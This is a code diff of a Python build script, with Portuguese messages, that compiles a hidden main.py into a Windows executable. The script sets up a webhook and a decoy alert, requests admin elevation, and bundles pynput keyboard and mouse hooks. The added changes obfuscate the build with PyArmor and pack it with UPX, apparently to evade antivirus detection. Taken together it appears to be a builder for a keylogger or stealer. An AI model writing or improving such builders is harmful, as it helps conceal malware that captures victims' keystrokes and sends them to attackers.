@@ -2,6 +2,13 @@ import subprocess
 import os
 import json
 import inquirer
+import random
+import time
+import requests
+import zipfile
+import shutil
+
+UPX_URL = "https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip"  
 
 def load_config():
     if os.path.exists("config.json"):
@@ -51,16 +58,47 @@ def ask_alert_details(config):
     config["ALERT_TITLE"] = answers['ALERT_TITLE']
     config["ALERT_CONTENT"] = answers['ALERT_CONTENT']
 
-def compile_main(config):
+def check_installation(tool_name):
     try:
-        subprocess.run(["pyinstaller", "--version"], check=True, capture_output=True)
+        subprocess.run([tool_name, "--version"], check=True, capture_output=True)
     except subprocess.CalledProcessError:
-        print("PyInstaller não está instalado. Instalando...")
-        subprocess.run(["pip", "install", "pyinstaller"], check=True)
+        print(f"{tool_name} não está instalado. Instalando...")
+        subprocess.run(["pip", "install", tool_name], check=True)
+
+def download_and_extract_upx():
+    upx_zip_path = "upx.zip"
+    upx_extract_dir = "upx"
+
+    print("Baixando o UPX...")
+    response = requests.get(UPX_URL, stream=True)
+    with open(upx_zip_path, "wb") as f:
+        shutil.copyfileobj(response.raw, f)
+    
+    print("Extraindo o UPX...")
+    with zipfile.ZipFile(upx_zip_path, 'r') as zip_ref:
+        zip_ref.extractall(upx_extract_dir)
+
+    os.remove(upx_zip_path)
+    return os.path.join(upx_extract_dir, "upx-4.0.2-win64", "upx.exe")
+
+def check_or_install_upx():
+    upx_path = os.path.join(os.getcwd(), "upx", "upx.exe")
+
+    if not os.path.exists(upx_path):
+        print("UPX não encontrado, baixando e instalando na pasta local...")
+        upx_path = download_and_extract_upx()
+    else:
+        print(f"UPX encontrado: {upx_path}")
+    
+    return upx_path
+
+def compile_main(config):
+    check_installation("pyinstaller")
+    check_installation("pyarmor")
 
     try:
         print("Ofuscando o código com PyArmor...")
-        subprocess.run(["pyarmor", "pack", "-x", " --onefile --noconsole", "main.py"], check=True)
+        subprocess.run(["pyarmor", "pack", "-x", " --advanced 2 --onefile --noconsole", "main.py"], check=True)
     except subprocess.CalledProcessError as e:
         print(f"Erro durante a ofuscação: {e}")
         return
@@ -77,21 +115,31 @@ def compile_main(config):
     ]
 
     command.extend([
-        "--windowed",
-        "--uac-admin",
-        "--hidden-import=pynput.keyboard._win32",
+        "--windowed",  
+        "--uac-admin", 
+        "--hidden-import=pynput.keyboard._win32",  
         "--hidden-import=pynput.mouse._win32",
     ])
 
     try:
+        print("Criando o executável com PyInstaller...")
         subprocess.run(command, check=True)
-        print("Build criada.")
+        
+        upx_path = check_or_install_upx()
+        print(f"Compactando o executável com UPX (usando {upx_path})...")
+        subprocess.run([upx_path, "--best", "--ultra-brute", "--force", "dist/Build.exe"], check=True) 
+
+        print("Build criada com sucesso.")
         print("O executável 'Build.exe' foi criado na pasta 'dist'.")
     except subprocess.CalledProcessError as e:
         print(f"Erro durante a compilação: {e}")
+
+
 
 if __name__ == "__main__":
     config = load_config()
     select_options(config)
     ask_webhook(config)  
+    
+    
     compile_main(config)
